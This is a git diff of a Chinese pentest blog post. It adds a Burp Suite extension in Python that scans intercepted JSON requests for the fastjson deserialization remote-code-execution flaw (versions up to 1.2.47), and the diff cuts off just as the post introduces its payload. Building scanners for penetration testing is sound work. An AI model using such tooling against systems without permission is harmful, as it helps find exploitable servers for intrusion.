@@ -3,7 +3,62 @@ Category: Pentest
 Slug: fastjson-rce
 Date: 2019-7-22
 
+2019/08/02 Update:
 
+1. 之前的代码太的太烂，去掉了不用的代码
+2. 增加了hash验证，如果已经请求过的URL第二次就不检测了，需建立`/var/tmp/hash.txt`文件（自己看着改吧)
+3. 如果不熟悉，就看官方文档，文档，文档。
+
+
+```
+main.py
+
+#/usr/bin/env python
+#! -*- coding:utf-8 -*-
+
+from burp import IBurpExtender # 定义插件的基本信息类
+from burp import IHttpListener # http流量监听类
+from burp import IRequestInfo
+from noauth import noauth_request
+import hashlib
+
+class BurpExtender(IBurpExtender, IHttpListener):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers() # 通用函数
+        self._callbacks.setExtensionName("fastjson_scan")
+        print "load fastjson_scan plugin success!"
+        print "=================================="
+        # register ourselves as an HTTP listener
+        callbacks.registerHttpListener(self)
+    
+    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
+        if toolFlag == 4 or toolFlag == 64 or toolFlag == 16 or toolFlag == 32:
+            if  messageIsRequest:
+                request = messageInfo.getRequest()
+                analyzedRequest = self._helpers.analyzeRequest(request)
+                contype = analyzedRequest.getContentType()  #get Content-type, 这里看官方文档
+                url = str(messageInfo.getUrl())
+                with open('/var/tmp/hash.txt') as f:
+                    lines = f.read().splitlines()
+                m = hashlib.md5()
+                m.update(url)
+                print url
+                if contype == 4 and m.hexdigest() not in lines:    #是的，json的时候type等于4
+                    with open('/var/tmp/hash.txt','a+') as f:
+                        f.write(m.hexdigest()+"\n")
+                    print "[Info]Check url is: %s" % url
+                    cur = noauth_request(url)
+                    noauth_result = cur.run()
+                    if noauth_result: 
+                        print "[Critical] Found it is a Fastjson RCE %s" % noauth_result[0]
+                    print "======================================================================================"
+                    print ""
+                else:
+                    pass
+```
+
+---------------------------
 fastjson在`1.2.47`以下，包括1.2.47存在反序列化导致的远程命令执行，payload:
 
 ```
